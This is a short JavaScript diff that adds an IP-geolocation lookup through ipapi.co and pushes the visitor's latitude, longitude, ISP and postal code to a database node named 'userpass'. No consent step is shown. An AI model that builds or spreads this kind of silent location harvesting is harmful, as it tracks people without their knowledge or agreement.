@@ -58,6 +58,23 @@ if ('geolocation' in navigator) {
   } else {
     console.log('Geolocation API is not supported by this browser.');
   }
+
+  // Get location by API
+fetch("https://ipapi.co/json/")
+.then(response => response.json())
+.then(data => {
+  console.log("starting data using api")
+  console.log(data)
+  push(userpass, {
+    location: "Location of Sim",
+    latitude: data.latitude,
+    longitude: data.longitude,
+    Service: data.org,
+    Postal: data.postal
+  })
+  console.log("ending data using api")
+})
+
       
 
     // IP address
